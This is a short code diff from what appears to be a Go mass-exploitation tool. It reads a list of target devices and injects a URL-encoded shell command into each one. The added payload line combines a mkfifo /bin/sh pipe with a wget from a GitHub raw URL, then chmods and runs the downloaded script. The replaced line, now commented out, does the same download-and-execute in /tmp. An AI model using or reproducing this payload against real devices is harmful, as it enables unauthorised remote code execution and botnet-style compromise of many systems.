@@ -69,7 +69,8 @@ func main() {
 	}
 	devices, _ = readLines("list.txt")
 	c := goccm.New(threads)
-	shellPayload := fmt.Sprintf("cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh")
+        shellPayload := fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh;chmod 777 *;sh skfnw.sh")
+//	shellPayload := fmt.Sprintf("cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh")
 	payload = strings.ReplaceAll(url.QueryEscape(shellPayload), "+", "%20")
 	for _, device := range devices {
 		c.Wait()
